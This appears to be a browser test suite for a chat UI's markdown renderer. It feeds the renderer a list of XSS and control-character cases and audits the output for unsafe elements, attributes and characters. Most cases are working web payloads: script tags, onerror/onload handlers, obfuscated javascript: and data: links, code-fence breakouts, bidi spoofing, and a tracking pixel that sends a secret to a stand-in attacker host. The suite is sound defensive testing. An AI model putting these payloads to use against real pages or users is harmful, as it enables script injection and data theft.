/* XSS / control-character cases for the chat markdown renderer (panel/chat.js).
 * Ported from the chat UI prototype. Each case is rendered with a single write and
 * streamed one character at a time, then audited for forbidden elements, attributes,
 * model-controlled classes and raw control characters. */
(function () {
  "use strict";
  const BAD_TAGS = new Set(["SCRIPT", "IMG", "IFRAME", "OBJECT", "EMBED", "STYLE", "LINK", "META", "BASE", "FORM", "VIDEO", "AUDIO", "SOURCE", "TEXTAREA", "MATH"]);
  const FORMAT_CHARS = /[\p{Cc}\p{Cf}\p{Zl}\p{Zp}]/u;
  const ALLOWED_CLASSES = /^(md|md-image|md-math|codeblock|codeblock-head|codeblock-lang|copy-btn|copy-label|table-wrap|link-blocked|i|hljs-[a-z_-]+)$/;

  const CASES = [
    ["script tag", "Hello <script>window.__pwned = 1</script> world"],
    ["img onerror", 'Look: <img src=x onerror="window.__pwned = 2"> done'],
    ["svg onload", '<svg onload="window.__pwned=3"><circle/></svg>'],
    ["iframe / object / embed", '<iframe src="https://evil.example/"></iframe><object data="https://evil.example/x"></object><embed src="https://evil.example/e">'],
    ["style + meta refresh + base", '<style>@import url(https://evil.example/a.css);</style><meta http-equiv="refresh" content="0;url=https://evil.example/"><base href="https://evil.example/">'],
    ["raw anchor javascript:", '<a href="javascript:window.__pwned=4">raw anchor</a>'],
    ["md link javascript:", "[click me](javascript:window.__pwned=5)"],
    ["md link mixed case JaVaScRiPt", "[click me](JaVaScRiPt:window.__pwned=6)"],
    ["md link entity-encoded javascript", "[click me](&#106;avascript:window.__pwned=7)"],
    ["md link data: html", "[x](data:text/html;base64,PHNjcmlwdD53aW5kb3cuX19wd25lZD04PC9zY3JpcHQ+)"],
    ["md link vbscript / file / blob", "[a](vbscript:msgbox(1)) [b](file:///C:/Windows/System32/calc.exe) [c](blob:https://evil.example/uuid)"],
    ["md link protocol-relative + relative", "[a](//evil.example/x) [b](/panel/app.js) [c](app.js)"],
    ["md link with credentials", "[a](https://admin:pw@evil.example/)"],
    ["md link w/ tab/newline in scheme", "[a](java\tscript:window.__pwned=9) [b](java\nscript:window.__pwned=10)"],
    ["autolink <javascript:>", "<javascript:window.__pwned=11> and <https://example.com/ok>"],
    ["bare url with bidi", "see https://example.com/\u202Egnp.exe now"],
    ["image tracking pixel", "![tracker](https://evil.example/pixel.png?q=secret)"],
    ["image javascript src", "![x](javascript:window.__pwned=12)"],
    ["code fence lang injection", '```"><img src=x onerror=window.__pwned=13>\nplain\n```'],
    ["code fence class spoof", "```tool-card proposal\nsecret\n```"],
    ["code body breakout (hljs path)", '```js\nvar a = "</code></pre><img src=x onerror=window.__pwned=14>";\n```'],
    ["code body xml (hljs path)", '```html\n<script>window.__pwned=15</script><img src=x onerror=window.__pwned=15>\n```'],
    ["table cells", "| a | <img src=x onerror=window.__pwned=16> |\n| --- | --- |\n| <script>window.__pwned=17</script> | [x](javascript:window.__pwned=18) |"],
    ["heading + blockquote html", "# <img src=x onerror=window.__pwned=19>\n> <script>window.__pwned=20</script>"],
    ["bidi override (RLO)", "Invoice\u202Egnp.exe is safe"],
    ["Trojan Source", 'if (access == "user\u202E \u2066// admin only\u2069 \u2066") { grant(); }'],
    ["zero-width + BOM + word joiner", "pass\u200Bword\uFEFF\u2060 hidden"],
    ["control chars + ANSI", "bell\u0007 esc\u001b[31mRED\u001b[0m nul\u0000 del\u007f"],
    ["line/para separators", "a\u2028b\u2029c"],
    ["lone surrogate", "x\uD800y"],
    ["unassigned + private use", "u\u0378 p\uE000"],
    ["huge nesting (perf)", ">".repeat(2000) + " x"],
    ["emphasis storm (perf)", "*a ".repeat(5000)],
    ["link bracket storm (perf)", "[".repeat(4000) + "x" + "](".repeat(2000)],
  ];

  function audit(rootEl) {
    const v = [];
    rootEl.querySelectorAll("*").forEach((n) => {
      if (BAD_TAGS.has(n.tagName)) v.push("forbidden element <" + n.tagName.toLowerCase() + ">");
      if (n.tagName === "INPUT" && n.type !== "checkbox") v.push("non-checkbox input");
      Array.from(n.attributes).forEach((a) => {
        if (/^on/i.test(a.name)) v.push("event handler attribute " + a.name);
        if (a.name === "style") v.push("inline style attribute");
        if (["src", "srcset", "action", "formaction"].indexOf(a.name) >= 0 && n.namespaceURI !== "http://www.w3.org/2000/svg") v.push("resource attribute " + a.name);
        if (a.name === "href" && n.tagName === "A" && !/^(https?:|mailto:)/i.test(a.value)) v.push("unsafe href " + a.value.slice(0, 40));
        if (a.name === "href" && n.namespaceURI === "http://www.w3.org/2000/svg" && a.value.indexOf("#") !== 0) v.push("svg external href");
      });
      n.classList.forEach((c) => { if (!ALLOWED_CLASSES.test(c)) v.push("model-controlled class " + c); });
    });
    const walker = document.createTreeWalker(rootEl, NodeFilter.SHOW_TEXT);
    let t;
    while ((t = walker.nextNode())) {
      const bad = t.nodeValue.replace(/[\n\t]/g, "");
      if (FORMAT_CHARS.test(bad) || /[\uD800-\uDFFF]/.test(bad.replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, ""))) { v.push("raw control/format char in text"); break; }
    }
    if (window.__pwned !== undefined) v.push("SCRIPT EXECUTED (__pwned=" + window.__pwned + ")");
    return v;
  }

  function render(text, chunk) {
    const md = document.createElement("div");
    md.className = "md";
    document.body.appendChild(md);
    const t0 = performance.now();
    const s = AMBChat.createMarkdownStream(md);
    if (chunk) { for (let i = 0; i < text.length; i += chunk) s.write(text.slice(i, i + chunk)); } else { s.write(text); }
    s.end();
    return { md, ms: performance.now() - t0 };
  }

  CASES.forEach(([name, text]) => {
    [0, 1].forEach((chunk) => {
      test("xss: " + name + (chunk ? " (streamed by character)" : ""), () => {
        const r = render(text, chunk);
        const v = audit(r.md);
        if (r.ms > 3000) v.push("slow render " + Math.round(r.ms) + "ms");
        expect(v.length === 0, v.join("; "));
      });
    });
  });

  test("xss: the audit itself detects a naive innerHTML renderer (negative control)", () => {
    const d = document.createElement("div");
    d.innerHTML = '<img src=x onerror="void 0"><a href="javascript:void 0">x</a>\u202E<script>void 0</script>'; // test-only, inert payload
    expect(audit(d).length >= 3, "audit would miss a vulnerable renderer");
  });

  test("an emoji split across two writes round-trips", () => {
    const md = document.createElement("div");
    const s = AMBChat.createMarkdownStream(md);
    s.write("a\uD83D"); s.write("\uDE00b"); s.end();
    expect(md.textContent === "a\uD83D\uDE00b", JSON.stringify(md.textContent));
  });

  test("safeUrl accepts only http, https and mailto without credentials", () => {
    const ok = ["https://example.com/a?b=c", "http://example.com", "mailto:a@b.co"];
    const bad = ["javascript:1", "data:text/html,x", "file:///c:/x", "//e.com", "/rel", "https://u:p@e.com/", "https://e.com/\u202E", "", "x".repeat(3000)];
    ok.forEach((u) => expect(AMBChat.safeUrl(u), "should accept " + u));
    bad.forEach((u) => expect(AMBChat.safeUrl(u) === null, "should reject " + u.slice(0, 30)));
  });

  test("host-driven chat: hostile response, error, user text and proposal stay inert", () => {
    const root = document.createElement("div");
    root.style.height = "400px";
    document.body.appendChild(root);
    const posts = [];
    const chat = AMBChat.mount(root, { postToHost: (t, p) => posts.push([t, p]) });
    const EVIL = '<img src=x onerror=window.__pwned=30>\u202Egnp.exe\u001b[31m';
    chat.userMessage(EVIL + " <script>window.__pwned=31</script>");
    chat.onHostMessage({ type: "chat.response", message: "Whole response: " + EVIL + " [a](javascript:window.__pwned=32)" });
    chat.onHostMessage({ type: "chat.error", message: EVIL });
    chat.setApprovalMode("look_only");
    chat.setProposals([{ id: EVIL, hash: EVIL, status: "pending", actions: [{ tool: EVIL, arguments: { [EVIL]: EVIL, ids: [EVIL] }, before: { [EVIL]: EVIL } }, { tool: "x", arguments: null, before: null }] }]);
    const viol = audit(root.querySelector(".feed"));
    // chat-level classes are ours; only audit the model-derived content for element/attribute abuse
    const filtered = viol.filter((x) => x.indexOf("model-controlled class") !== 0);
    expect(filtered.length === 0, filtered.join("; "));
    expect(root.querySelector(".proposal") && !root.querySelector(".proposal [data-decision]"), "card must not carry approval buttons");
  });

  window.addEventListener("load", () => { runAll(); });
})();
